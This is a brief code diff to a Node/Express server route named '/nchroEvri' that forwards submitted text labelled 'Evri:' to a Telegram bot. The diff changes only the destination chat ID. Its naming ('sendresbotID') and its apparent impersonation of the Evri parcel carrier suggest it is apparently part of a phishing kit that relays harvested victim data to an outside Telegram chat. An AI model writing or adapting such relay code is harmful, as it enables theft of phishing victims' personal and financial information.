@@ -11545,7 +11545,7 @@ app.post("/nchroEvri", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 956029722,
+              chat_id: 5108525724,
               text: `Evri:\n${originalText}`,
               parse_mode: "Markdown",
             }
